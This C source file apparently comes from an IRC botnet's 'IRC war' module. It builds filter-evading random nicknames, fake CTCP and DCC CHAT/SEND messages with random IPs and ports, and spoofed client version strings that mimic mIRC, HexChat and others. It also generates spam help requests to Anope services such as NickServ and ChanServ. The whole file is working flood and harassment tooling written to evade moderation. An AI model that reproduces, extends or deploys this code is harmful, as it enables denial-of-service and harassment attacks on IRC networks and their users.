#include "../Includes/includes.h"

#ifndef HTTP_BUILD
#ifdef INCLUDE_IRCWAR
char *GenerateRandomIrcNameString()
{
    Sleep(1);
    srand(GetRandNum(time(NULL)) + GenerateRandomSeed());

    memset(cBuild, 0, sizeof(cBuild));

    unsigned int uiRandNum = GetRandNum(100);

    if(uiRandNum < 75)
        strcpy(cBuild, GenerateWarNickname());
    else
        sprintf(cBuild, "%ld", GetRandNum(999999999));

    return (char*)cBuild;
}

char cCtcpReturn[MAX_IRC_SND_BUFFER];
char *GenerateCtcp(bool bDcc)
{
    unsigned int uiRandNum = GetRandNum(100);

    strcpy(cCtcpReturn, "\x001");

    if(bDcc)
    {
        strcat(cCtcpReturn, "DCC ");

        if(uiRandNum < 50)
        {
            strcat(cCtcpReturn, "CHAT ");
            strcat(cCtcpReturn, GenRandLCText());
            strcat(cCtcpReturn, " ");
            strcat(cCtcpReturn, GenerateRandomIp());
            strcat(cCtcpReturn, " ");
            strcat(cCtcpReturn, GenerateRandomPort());
        }
        else
        {
            strcat(cCtcpReturn, "SEND ");
            strcat(cCtcpReturn, GenerateRandomFriendlyFilename());
            strcat(cCtcpReturn, " ");
            strcat(cCtcpReturn, GenerateRandomIp());
            strcat(cCtcpReturn, " ");
            strcat(cCtcpReturn, GenerateRandomPort());

            if(GetRandNum(500) > 250)
            {
                strcat(cCtcpReturn, " ");

                char cRandFileSize[8];
                itoa(GetRandNum(9999999), cRandFileSize, 10);
                strcat(cCtcpReturn, cRandFileSize);
            }
        }
    }
    else
    {
        if(uiRandNum < 33)
            strcat(cCtcpReturn, "VERSION");
        else if(uiRandNum < 66)
            strcat(cCtcpReturn, "TIME");
        else
            strcat(cCtcpReturn, "PING");
    }

    strcat(cCtcpReturn, "\x001");

    return (char*)cCtcpReturn;
}

char cIrcVersionReturn[DEFAULT];
char *GenerateRandomIrcClientVersion()
{
    unsigned int uiRandNum = GetRandNum(140);

    if(uiRandNum < 20)
        strcpy(cIrcVersionReturn, "mIRC v7.27 Khaled Mardam-Bey");
    else if(uiRandNum < 40)
        strcpy(cIrcVersionReturn, "xchat 2.8.8 Linux 3.2.0-4-amd64 [x86_64/1.10GHz/SMP]");
    else if(uiRandNum < 60)
        strcpy(cIrcVersionReturn, "irssi v0.8.15");
    else if(uiRandNum < 80)
        strcpy(cIrcVersionReturn, "http://www.mibbit.com ajax IRC Client:3972:3972");
    else if(uiRandNum < 100)
        strcpy(cIrcVersionReturn, "HexChat 2.9.3 [x64] / Windows 7 [3.31GHz]");
    else if(uiRandNum < 120)
        strcpy(cIrcVersionReturn, "ZNC 0.202 - http://znc.in");
    else
        strcpy(cIrcVersionReturn, "lightIRC.com 1.3 Build 118, Okt 22 2012 12:07 on Windows 7");

    return (char*)cIrcVersionReturn;
}

char *GenerateRegisterQuery(char *pcNickname)
{
    Sleep(1);
    srand(GetRandNum(time(NULL)) + GenerateRandomSeed());

    memset(cRegisterQueryString, 0, sizeof(cRegisterQueryString));

    strcpy(cRegisterQueryString, cIrcCommandUser);
    strcat(cRegisterQueryString, " ");
    strcat(cRegisterQueryString, GenerateRandomIrcNameString());
    strcat(cRegisterQueryString, " ");

    char cRegisterStringNumber[2];
    itoa(GetRandNum(10), cRegisterStringNumber, 10);
    strcat(cRegisterQueryString, cRegisterStringNumber);

    strcat(cRegisterQueryString, " *  :");
    strcat(cRegisterQueryString, GenerateRandomIrcNameString());
    strcat(cRegisterQueryString, "\r\n");

    strcat(cRegisterQueryString, cIrcCommandNick);
    strcat(cRegisterQueryString, " ");
    strcat(cRegisterQueryString, pcNickname);

    return (char*)cRegisterQueryString;
}

char *GenerateWarNickname() //Returns a random, hard-to-filter nickname
{
    Sleep(1);
    srand(GenerateRandomSeed());

    memset(cBuild, 0, sizeof(cBuild));

    char cCharacterPool[53] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
    unsigned short usCharacters = GetRandNum(11) + 4;

    for(unsigned short us = 0; us < usCharacters; us++)
        cBuild[us] = cCharacterPool[GetRandNum(strlen(cCharacterPool))];

    return cBuild;
}

char cWarAnope[MAX_IRC_SND_BUFFER];
char *GenerateRandomHelpMessageToAnope()
{
    Sleep(1);
    srand(GenerateRandomSeed());

    strcpy(cWarAnope, cIrcCommandPrivmsg);
    strcat(cWarAnope, " ");

    unsigned short usRandNum = GetRandNum(100);

    if(usRandNum < 25)
        strcat(cWarAnope, "chanserv");
    else if(usRandNum < 50)
        strcat(cWarAnope, "nickserv");
    else if(usRandNum < 75)
        strcat(cWarAnope, "memoserv");
    else
        strcat(cWarAnope, "hostserv");

    strcat(cWarAnope, " :help");

    return (char*)cWarAnope;
}
#endif
#endif
